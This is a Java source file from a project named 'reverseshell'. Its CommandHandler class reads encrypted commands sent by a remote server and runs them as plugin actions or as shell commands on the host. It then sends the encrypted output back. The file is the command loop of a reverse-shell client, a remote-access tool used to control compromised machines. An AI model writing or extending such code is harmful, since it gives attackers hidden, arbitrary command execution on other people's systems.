package obs1d1anc1ph3r.reverseshell.commandhandling;

import obs1d1anc1ph3r.reverseshell.plugins.PluginManager;
import java.io.*;
import java.util.logging.Logger;
import obs1d1anc1ph3r.reverseshell.responsehandling.ResponseSender;
import obs1d1anc1ph3r.reverseshell.plugins.CommandPlugin;
import obs1d1anc1ph3r.reverseshell.utils.StreamHandler;

public class CommandHandler {

	private static final Logger logger = Logger.getLogger(CommandHandler.class.getName());
	private final PluginManager pluginManager;
	private final CommandExecutor commandExecutor;
	private final CommandReader commandReader;
	private final ResponseSender responseSender;

	public CommandHandler(StreamHandler streamHandler, PluginManager pluginManager) {
		this.pluginManager = pluginManager;
		this.commandExecutor = new CommandExecutor();
		byte[] encryptionKey = streamHandler.getEncryptionKey();

		this.commandReader = new CommandReader(streamHandler, encryptionKey);
		this.responseSender = new ResponseSender(streamHandler, encryptionKey);
	}

	//Handle commands here
	public void handleCommands() throws IOException, Exception {
		String command;
		while ((command = commandReader.readCommand()) != null) {
			if (command.equalsIgnoreCase("exit")) {
				logger.info("Server disconnected.");
				break;
			}

			//Split the command stuff
			String[] commandParts = command.split(" ", 2);
			String commandName = commandParts[0].toLowerCase();
			//If the command starts with a plugin, get it
			CommandPlugin plugin = pluginManager.getPlugin(commandName);

			if (plugin != null) {
				//Do the plugin thing
				String response = plugin.execute(commandParts.length > 1 ? new String[]{commandParts[1]} : new String[]{});
				if (response != null && !response.isEmpty()) {
					responseSender.sendEncryptedResponse(response);
				}
			} else {
				String response = commandExecutor.executeCommand(command);
				responseSender.sendEncryptedResponse(response);
			}
		}
	}

	public CommandReader getCommandReader() {
		return commandReader;
	}

	public ResponseSender getResponseSender() {
		return responseSender;
	}

}
